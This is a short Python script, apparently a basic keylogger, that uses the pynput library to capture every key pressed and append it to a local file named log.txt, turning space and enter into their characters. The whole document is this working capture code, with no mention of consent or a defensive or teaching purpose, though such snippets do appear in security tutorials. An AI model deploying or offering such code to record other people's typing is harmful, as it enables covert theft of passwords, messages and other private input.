from pynput.keyboard import Listener

# Function to write to log file
def write_to_log(key):
    # Check for the keys
    if str(key) == "Key.space":
        data = " "
    elif str(key) == "Key.enter":
        data = "\n"
    else:
        data = str(key).replace("'", "")

    # Append the text to log file
    with open("log.txt", 'a') as log:
        log.write(data)

# Listen for the keystrokes
with Listener(on_press=write_to_log) as l:
    l.join()